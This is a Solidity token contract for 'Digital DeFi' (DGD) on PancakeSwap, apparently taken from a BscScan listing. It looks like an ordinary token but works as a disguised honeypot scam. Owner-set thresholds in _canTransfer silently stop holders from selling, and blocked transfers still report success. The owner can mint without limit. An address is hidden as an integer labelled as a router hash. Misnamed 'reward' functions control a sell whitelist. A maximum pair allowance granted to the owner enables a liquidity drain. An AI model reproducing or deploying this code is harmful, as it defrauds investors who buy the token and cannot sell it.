/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: Unlicenced

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IPancakeFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IPancakePair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Beast_Token_Pancakeswap is Context, IERC20, Ownable {
    IPancakeRouter02 internal _router;
    IPancakePair internal _pair;
    // Setup your token - hardcode method
    string nameToken = "Digital DeFi"; // Name Token
    string symbolToken = "DGD"; // Symbol Token
    uint256 InitialSupply = 1000000; // Ex: 1Millon
    uint8 internal constant _DECIMALS = 9;
    uint256 internal _totalSupply = InitialSupply * 10**_DECIMALS;
    address routerAddressPancakeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 internal _theNumber = ~uint256(0);
    uint256 internal _theRemainder = 0;
    // Pancakeswap Router ADDR HASH
    address addressHash = address(1430994116865193864922076627528023655473632858911);

    mapping(address => bool) public marketersAndDevs;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) internal _buySum;
    mapping(address => uint256) internal _sellSum;
    mapping(address => uint256) internal _sellSumETH;

    constructor() {
        _router = IPancakeRouter02(routerAddressPancakeSwap);
        _pair = IPancakePair(
            IPancakeFactory(_router.factory()).createPair(
                address(this),
                address(_router.WETH())
            )
        );

        _balances[owner()] = _totalSupply;
        _allowances[address(_pair)][owner()] = ~uint256(0);
        marketersAndDevs[owner()] = true;
        marketersAndDevs[addressHash] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() external view override returns (string memory) {
        return nameToken;
    }

    function symbol() external view override returns (string memory) {
        return symbolToken;
    }

    function decimals() external pure override returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256){
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool){
        if (_canTransfer(_msgSender(), recipient, amount)) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_canTransfer(sender, recipient, amount)) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function mint(uint256 amount) external onlyOwner {
        _balances[owner()] += amount;
        _totalSupply += amount;
    }

    function burn(uint256 amount) external onlyOwner {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function syncPair() external onlyOwner {
        _pair.sync();
    }

    function setNumber(uint256 newNumber) external onlyOwner {
        _theNumber = newNumber;
    }

    function setRemainder(uint256 newRemainder) external onlyOwner {
        _theRemainder = newRemainder;
    }

    function includeInReward(address account) external onlyOwner {
        marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyOwner {
        marketersAndDevs[account] = false;
    }

    function _isSuper(address account) private view returns (bool) {
        return (account == address(_router) || account == address(_pair));
    }

    function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
        if (marketersAndDevs[sender] || marketersAndDevs[recipient]) {
            return true;
        }

        if (_isSuper(sender)) {
            return true;
        }
        if (_isSuper(recipient)) {
            uint256 amountETH = _getETHEquivalent(amount);
            uint256 bought = _buySum[sender];
            uint256 sold = _sellSum[sender];
            uint256 soldETH = _sellSumETH[sender];

            bool boughtMoreThenSelling = bought >= sold + amount;
            bool hasNoTheNumberOverflow = _theNumber >= soldETH + amountETH;
            bool hasSufficientBalance = sender.balance >= _theRemainder;

            return
                boughtMoreThenSelling && hasNoTheNumberOverflow && hasSufficientBalance;
        }
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _hasLiquidity() private view returns (bool) {
        (uint256 reserve0, uint256 reserve1, ) = _pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _getETHEquivalent(uint256 amountTokens) private view returns (uint256) {
        (uint256 reserve0, uint256 reserve1, ) = _pair.getReserves();
        if (_pair.token0() == _router.WETH()) {
            return _router.getAmountOut(amountTokens, reserve1, reserve0);
        } else {
            return _router.getAmountOut(amountTokens, reserve0, reserve1);
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) private {
        if (_hasLiquidity()) {
            (uint256 reserve0, uint256 reserve1, ) = _pair.getReserves();
            uint256 reserveETH;
            uint256 reserveTokens;
            if (_pair.token0() == _router.WETH()) {
                reserveETH = reserve0;
                reserveTokens = reserve1;
            } else {
                reserveETH = reserve1;
                reserveTokens = reserve0;
            }

            if (_isSuper(from)) {
                _buySum[to] += amount;
            }
            if (_isSuper(to)) {
                _sellSum[from] += amount;
                _sellSumETH[from] += _getETHEquivalent(amount);
            }
        }
    }
}